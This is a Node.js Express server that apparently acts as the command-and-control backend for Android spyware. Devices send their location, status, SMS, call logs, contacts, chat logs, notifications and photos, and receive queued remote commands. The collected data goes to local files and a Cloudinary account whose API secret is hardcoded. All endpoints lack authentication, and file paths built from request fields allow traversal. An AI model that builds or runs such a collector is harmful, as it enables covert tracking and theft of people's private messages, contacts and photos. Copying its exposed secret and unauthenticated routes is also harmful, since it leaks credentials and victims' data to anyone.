const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. CLOUDINARY CONFIG (Tumhari Details) ---
cloudinary.config({
  cloud_name: 'dxnh5vuik',
  api_key: '185953318184881',
  api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- 2. SETUP & MIDDLEWARE ---
// Uploads folder for JSON files (Logs/SMS)
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

// Allow All Origins (CORS Fix)
app.use(cors({ origin: '*' }));

// Data Limits (Badi photos aur logs ke liye 50MB)
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// In-Memory Storage for Live Status (RAM)
let devicesStatus = {}; 

// --- 3. ROOT ROUTE (Health Check) ---
app.get('/', (req, res) => {
    res.send('✅ Server is Running Successfully!');
});

// ==================================================
//  GALLERY SYSTEM (CLOUDINARY)
// ==================================================

// A. PHOTO UPLOAD ROUTE (Android -> Server -> Cloudinary)
app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data } = req.body;

    if (!device_id || !image_data) {
        return res.status(400).json({ error: "No Data Received" });
    }

    const id = device_id.toString().trim().toUpperCase();

    // Check if base64 header exists, if not add it
    let base64Image = image_data;
    if (!base64Image.startsWith('data:image')) {
        base64Image = "data:image/jpeg;base64," + image_data;
    }

    // Upload to Cloudinary
    cloudinary.uploader.upload(base64Image, 
        { 
            folder: id, // Device ID ka Folder
            public_id: Date.now().toString(), 
            resource_type: "image"
        },
        function(error, result) {
            if (error) {
                console.error("❌ Cloudinary Error:", error);
                return res.status(500).json({ error: "Upload Failed" });
            }
            console.log(`📸 [GALLERY] New Photo Saved for ${id}`);
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

// B. GALLERY LIST ROUTE (Website -> Server -> Cloudinary)
app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null;

    cloudinary.api.resources({
        type: 'upload',
        prefix: id + "/", // Folder match
        max_results: 10,  // Ek baar mein 10 photos fetch karega
        next_cursor: next_cursor, 
        context: true
    }, 
    function(error, result) {
        if (error) {
            // Folder nahi mila to empty list bhejo
            return res.json({ photos: [], next_cursor: null });
        }

        const photos = result.resources.map(img => img.secure_url);
        res.json({ 
            photos: photos, 
            next_cursor: result.next_cursor 
        });
    });
});

// ==================================================
//  ADMIN DASHBOARD & STATUS
// ==================================================

// 1. Get All Devices
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

// 2. Single Device Status
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    
    if (!device) return res.json({ id: id, isOnline: false });
    
    // Online logic (60 seconds timeout)
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

// 3. PHONE PING (Connection)
app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        
        // Check for pending commands
        let pendingCommand = "none";
        if (devicesStatus[id] && devicesStatus[id].command) {
            pendingCommand = devicesStatus[id].command;
            devicesStatus[id].command = "none"; // Clear queue
        }

        // Status Update
        devicesStatus[id] = {
            ...devicesStatus[id], 
            id: id,
            model: model || (devicesStatus[id]?.model || "Unknown"),
            battery: battery || level || 0,
            version: version || "--",
            charging: (String(charging) === "true"),
            lat: lat || (devicesStatus[id]?.lat || 0),
            lon: lon || (devicesStatus[id]?.lon || 0),
            lastSeen: Date.now(),
            command: devicesStatus[id]?.command || "none" 
        };

        if(pendingCommand !== "none") {
            console.log(`📡 [PING] ${id} Command Sent: ${pendingCommand}`);
        }

        res.json({ status: "success", command: pendingCommand });

    } catch (e) {
        console.error("Ping Error:", e);
        res.status(500).json({ error: "Server Error" });
    }
});

// 4. Send Command
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    
    const id = device_id.toUpperCase().trim();
    
    if (!devicesStatus[id]) {
        devicesStatus[id] = { id: id, lastSeen: 0 };
    }
    
    devicesStatus[id].command = command;
    console.log(`🚀 [ADMIN] Sending Command '${command}' to Device ${id}`);
    
    res.json({ status: "success", command: command });
});

// ==================================================
//  DATA STORAGE (SMS, Contacts, Logs)
// ==================================================

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        // Save Location to Memory (for Dashboard Map)
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
            }
        }
        
        // Append Mode for Logs/SMS (Keep history)
        if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            // Keep last 2000 entries
            const finalData = [...newDataArray, ...existingData].slice(0, 2000); 
            
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
            console.log(`✅ [DATA] ${type} saved for ${id}`);
        } 
        else {
            // Overwrite Mode (Location etc)
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error (${type}):`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// Get Data for Website Viewer
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

// Start Server
app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
